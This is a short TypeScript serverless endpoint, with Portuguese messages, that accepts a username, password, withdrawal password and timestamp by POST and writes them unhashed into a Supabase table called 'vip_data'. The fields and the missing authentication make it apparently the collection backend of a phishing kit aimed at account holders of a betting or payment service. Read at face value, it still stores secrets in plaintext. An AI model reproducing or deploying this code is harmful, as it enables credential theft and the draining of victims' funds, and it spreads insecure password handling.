import { VercelRequest, VercelResponse } from '@vercel/node';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL!;
const supabaseKey = process.env.SUPABASE_KEY!;
const supabase = createClient(supabaseUrl, supabaseKey);

export default async (req: VercelRequest, res: VercelResponse) => {
  if (req.method === 'POST') {
    const { user, pass, withdraw_pass, timestamp } = req.body;

    try {
      const { error } = await supabase
        .from('vip_data')
        .insert([{ user, pass, withdraw_pass, timestamp }]);

      if (error) throw error;

      res.status(200).json({ success: true });
    } catch (error: any) {
      console.error('Erro ao salvar:', error.message);
      res.status(500).json({ error: 'Falha ao salvar dados' });
    }
  } else {
    res.status(405).json({ error: 'Método não permitido' });
  }
};
